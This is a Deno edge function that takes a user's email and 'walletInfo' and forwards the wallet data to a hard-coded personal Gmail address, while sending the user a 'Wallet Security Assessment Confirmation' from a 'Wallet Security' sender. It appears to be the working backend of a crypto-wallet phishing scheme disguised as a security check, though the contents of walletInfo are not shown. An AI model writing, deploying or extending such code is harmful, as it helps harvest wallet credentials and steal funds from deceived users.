
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { Resend } from "npm:resend@2.0.0"
import React from 'npm:react@18.3.1'
import { renderAsync } from 'npm:@react-email/components@0.0.22'
import { AdminNotification } from './_templates/admin-notification.tsx'
import { UserConfirmation } from './_templates/user-confirmation.tsx'

const resend = new Resend(Deno.env.get("RESEND_API_KEY"))
const adminEmail = "Officialstpnspprt@gmail.com"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { email, walletInfo } = await req.json()

    console.log("Processing wallet info submission for:", email)

    // Render admin email template
    const adminHtml = await renderAsync(
      React.createElement(AdminNotification, {
        email,
        walletInfo,
      })
    )

    // Render user email template
    const userHtml = await renderAsync(
      React.createElement(UserConfirmation, {
        email,
      })
    )

    // Send email to admin
    const adminEmailResult = await resend.emails.send({
      from: "Wallet Security <send@updates.getcryptoguard.com>",
      to: adminEmail,
      subject: "New Wallet Connection Request",
      html: adminHtml,
    })

    console.log("Admin email sent:", adminEmailResult)

    // Send confirmation email to user
    const userEmailResult = await resend.emails.send({
      from: "Wallet Security <send@updates.getcryptoguard.com>",
      to: email,
      subject: "Wallet Security Assessment Confirmation",
      html: userHtml,
    })

    console.log("User confirmation email sent:", userEmailResult)

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: "Emails sent successfully" 
      }),
      { 
        headers: { 
          "Content-Type": "application/json",
          ...corsHeaders
        } 
      }
    )

  } catch (error) {
    console.error("Error in send-wallet-info function:", error)
    return new Response(
      JSON.stringify({ 
        error: error.message 
      }),
      { 
        status: 500,
        headers: { 
          "Content-Type": "application/json",
          ...corsHeaders
        }
      }
    )
  }
})
